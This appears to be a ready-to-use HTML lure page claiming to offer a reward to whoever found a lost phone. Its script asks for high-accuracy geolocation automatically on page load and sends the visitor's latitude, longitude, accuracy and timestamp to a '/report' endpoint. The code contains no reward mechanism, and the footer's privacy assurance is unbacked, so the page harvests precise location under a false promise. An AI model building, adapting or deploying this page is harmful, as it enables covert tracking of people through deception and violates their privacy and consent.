<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Reward for Finder</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 420px;
      animation: fadeIn 0.8s ease-out;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .card {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 2rem;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.2);
      position: relative;
      overflow: hidden;
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
      z-index: -1;
    }
    
    .reward-badge {
      position: absolute;
      top: -10px;
      right: -10px;
      background: linear-gradient(45deg, #FFD700, #FFA500);
      color: #000;
      font-weight: bold;
      padding: 8px 15px;
      border-radius: 20px;
      font-size: 0.8rem;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      transform: rotate(5deg);
    }
    
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 1.5rem;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 2rem;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }
    
    h2 {
      font-size: 1.8rem;
      margin-bottom: 1rem;
      background: linear-gradient(45deg, #fff, #FFD700);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-weight: 700;
    }
    
    p {
      margin-bottom: 1.2rem;
      line-height: 1.6;
      font-weight: 300;
    }
    
    .highlight {
      color: #FFD700;
      font-weight: 500;
    }
    
    .btn-container {
      margin: 2rem 0 1rem;
    }
    
    .allow-btn {
      background: linear-gradient(45deg, #00C9FF, #92FE9D);
      border: none;
      color: #000;
      font-weight: 600;
      padding: 1rem 2rem;
      border-radius: 50px;
      cursor: pointer;
      font-size: 1.1rem;
      width: 100%;
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
    }
    
    .allow-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
    }
    
    .allow-btn:active {
      transform: translateY(1px);
    }
    
    .allow-btn::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
      transform: translateX(-100%);
    }
    
    .allow-btn:hover::after {
      animation: shimmer 1.5s infinite;
    }
    
    @keyframes shimmer {
      100% { transform: translateX(100%); }
    }
    
    .status {
      margin-top: 1.5rem;
      padding: 1rem;
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.1);
      display: none;
    }
    
    .status.success {
      display: block;
      background: rgba(46, 204, 113, 0.2);
      border: 1px solid rgba(46, 204, 113, 0.5);
    }
    
    .status.error {
      display: block;
      background: rgba(231, 76, 60, 0.2);
      border: 1px solid rgba(231, 76, 60, 0.5);
    }
    
    .loader {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .footer {
      margin-top: 1.5rem;
      font-size: 0.8rem;
      opacity: 0.7;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="reward-badge">REWARD</div>
      <div class="logo">🎁</div>
      <h2>Thank You for Finding This Phone!</h2>
      <p>If you found this device, please help return it to its owner.</p>
      <p>You'll receive a <span class="highlight">thank-you reward</span> once your location is verified!</p>
      
      <div class="btn-container">
        <button class="allow-btn" id="allowBtn">
          <span class="btn-text">Allow Location to Claim Reward</span>
        </button>
      </div>
      
      <div class="status" id="statusMsg"></div>
      
      <div class="footer">
        Your location data will only be used to verify the return process.
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const allowBtn = document.getElementById('allowBtn');
      const statusMsg = document.getElementById('statusMsg');
      const btnText = document.querySelector('.btn-text');
      
      // Automatically request location when page loads
      requestLocation();
      
      // Also allow manual retry
      allowBtn.addEventListener('click', requestLocation);
      
      function requestLocation() {
        statusMsg.className = 'status';
        btnText.innerHTML = '<span class="loader"></span> Requesting Location...';
        allowBtn.disabled = true;
        
        if (!navigator.geolocation) {
          showError('Geolocation is not supported by this browser.');
          return;
        }
        
        navigator.geolocation.getCurrentPosition(
          function(position) {
            // Success callback
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;
            
            btnText.textContent = 'Location Received!';
            statusMsg.className = 'status success';
            statusMsg.innerHTML = `
              <strong>Thank you!</strong><br>
              Your location has been received. Reward verification is in progress.
            `;
            
            // Send data to server
            sendLocationData(lat, lon, acc);
          },
          function(error) {
            // Error callback
            let errorMsg = 'Unable to retrieve your location. ';
            
            switch(error.code) {
              case error.PERMISSION_DENIED:
                errorMsg += 'Please allow location access to claim your reward.';
                break;
              case error.POSITION_UNAVAILABLE:
                errorMsg += 'Location information is unavailable.';
                break;
              case error.TIMEOUT:
                errorMsg += 'Location request timed out.';
                break;
              default:
                errorMsg += 'An unknown error occurred.';
            }
            
            showError(errorMsg);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      }
      
      function showError(message) {
        statusMsg.className = 'status error';
        statusMsg.innerHTML = `<strong>Location Access Needed</strong><br>${message}`;
        btnText.textContent = 'Try Again';
        allowBtn.disabled = false;
      }
      
      function sendLocationData(lat, lon, acc) {
        // Send data to server endpoint
        fetch('/report', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            latitude: lat,
            longitude: lon,
            accuracy: acc,
            timestamp: Date.now()
          })
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          console.log('Location data sent successfully:', data);
        })
        .catch(error => {
          console.error('Error sending location data:', error);
        });
      }
    });
  </script>
</body>
</html>
